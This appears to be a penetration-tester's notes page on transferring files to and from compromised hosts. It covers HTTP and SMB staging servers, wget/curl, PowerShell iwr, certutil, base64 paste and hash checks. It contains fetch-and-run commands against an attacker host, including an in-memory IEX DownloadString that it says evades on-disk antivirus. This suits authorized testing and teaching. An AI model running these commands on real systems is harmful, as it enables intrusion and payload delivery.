# File Transfer

Getting a file onto the target (an enumeration script, a payload) or off it (a database dump, a registry hive). Eight notes point here, so this is a decision layer, not a command list: **pick the channel by what the target can reach and what it already ships**, then verify the file arrived whole. The second half is the one people skip, and it is where the hour goes.

Order of preference: a channel that already exists — SMB, SSH, an HTTP client the box ships — beats one you build; anything beats pasting base64 into a shell.

## 1 — Stand up something to pull from

```bash
python3 -m http.server 80
```

- serve a **dedicated** directory, never your home → this process hands out everything beneath it to anyone who connects. `cd ~/transfer` first; a stray `python3 -m http.server` in `~` publishes your keys, your notes and every other box's loot.
- port `80` or `443`, not `8000` → these survive egress filtering that drops high ports, and they are the ports a locked-down target is allowed to reach outward on. Both need `sudo` because ports under 1024 are privileged — the failure when you forget is `Permission denied` at *bind* time, on your own machine, which is easy to misread as a target problem.

```bash
impacket-smbserver share "$(pwd)" -smb2support -user a -password a
```

- an SMB share Windows reads with a plain [[Security-Terms#^unc|UNC path]] — no download step and often nothing written to disk: `type \\ATTACKER_IP\share\file.txt` reads it straight off the wire.
- `-smb2support` → modern Windows refuses [[Security-Terms#^smbv1|SMBv1]] outright; omit this and the target answers `The specified network name is no longer available` and you debug the network instead of the handshake.
- `-user`/`-password` → Windows 10 and 11 refuse guest auth to a share by default. An unauthenticated share fails with `STATUS_ACCESS_DENIED` on exactly the modern targets you most want it for; give it a throwaway credential and map with `net use`.

## 2 — Pull onto a Linux target

```bash
wget http://ATTACKER_IP/linpeas.sh -O /tmp/lp.sh || curl http://ATTACKER_IP/linpeas.sh -o /tmp/lp.sh
```

- write to `/tmp` or `/dev/shm` → the current directory is often not writable by the web user, and the failure is `Permission denied` at write time, which reads like the fetch failed when it succeeded. `/dev/shm` is memory-backed, so nothing touches disk.
- `-O` / `-o` name the output → without them `wget` derives a filename and `curl` prints the file to your terminal instead of saving it. Full flag reference: [[Curl-and-Wget]].
- the `||` → tries `wget`, falls back to `curl`. One of the two is on essentially every Linux host; this saves you checking first.

Neither installed? The target still has one of these interpreters:

```bash
python3 -c 'import urllib.request as u; u.urlretrieve("http://ATTACKER_IP/f","/tmp/f")'
```

## 3 — Pull onto a Windows target

```powershell
iwr http://ATTACKER_IP/winPEASx64.exe -outfile "$env:TEMP\wp.exe" -UseBasicParsing
```

- `-UseBasicParsing` → on Windows PowerShell, `iwr` (`Invoke-WebRequest`) parses the response with Internet Explorer's engine, and on a profile where IE has never been launched it fails with `The response content cannot be parsed because the Internet Explorer engine is not available`. This flag skips that engine. The error names the browser, so it reads like a broken host rather than a missing flag. PowerShell 6 and later parse this way already.
- write to `$env:TEMP` → a predictable writable path; a bare filename lands in the current directory, which may be `C:\Windows\System32` where you cannot write.

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/enum.ps1')
```

- runs the script **in memory** — nothing is written, so on-disk antivirus never sees a file and there is nothing to clean up. This is the route to reach for when a downloaded `.exe` keeps disappearing. AMSI still reads the script as it runs, so a block here is a content decision, not a file one, and repeating the same command changes nothing.

From `cmd.exe`, where those are unavailable:

```cmd
certutil.exe -urlcache -split -f http://ATTACKER_IP/x.exe %TEMP%\x.exe
```

- `certutil` is a certificate tool that happens to fetch URLs. It is on every Windows and for exactly that reason is heavily signatured — a loud choice on a monitored host, and Defender now flags the download itself on many builds.

4. A clean transfer goes to [[Windows-Automated-Enumeration]] or whatever you pulled it for.

## 4 — When there is no network path back

```bash
base64 -w0 payload.bin          # attacker: one unbroken line to copy
```

```bash
echo -n '<blob>' | base64 -d > /tmp/payload.bin      # linux target
```

```powershell
[IO.File]::WriteAllBytes("$env:TEMP\p.exe",[Convert]::FromBase64String("<blob>"))
```

- `-w0` → do **not** wrap at 76 columns. Wrapped output pasted into a shell arrives with newlines mid-blob and decodes to a corrupt file that fails a hash check for a reason that is invisible in the terminal. This one flag is the whole trick.
- practical to a few hundred KB → beyond that the paste itself is the failure: terminals drop characters on very long pastes, and a single dropped character ruins the decode.

## 5 — Verify it arrived whole

```bash
md5sum payload.bin                       # attacker and linux target, compare the two
```

```powershell
Get-FileHash -Algorithm MD5 $env:TEMP\p.exe    # windows target
```

- compare against the **source** hash on your own box → the number is meaningless alone; you are checking the two match. Run `md5sum` on the original before you transfer, so you have something to compare to.
- [[Security-Terms#^md5|MD5]] is fine here → you are detecting accidental truncation, not defending against a forger. Speed matters more than collision resistance for this check.

## Service-native channels

When one of these ports is already open and authenticated, it beats standing up a server at all — the transfer rides a channel that exists:

- [[445-SMB]] — `get` / `put` / `mget *` at the `smbclient` prompt
- [[873-rsync]] — when an rsync module is exposed
- [[21-FTP]] — when port 21 is open and a login lands; **`put` needs a second argument** or it sends the full local path as the remote name and the server answers `553`, which reads exactly like a permission denial
- [[5985-WinRM]] — `upload` and `download` are built into the Evil-WinRM session
- [[22-SSH]] — `scp file user@host:/tmp/` when you hold SSH credentials
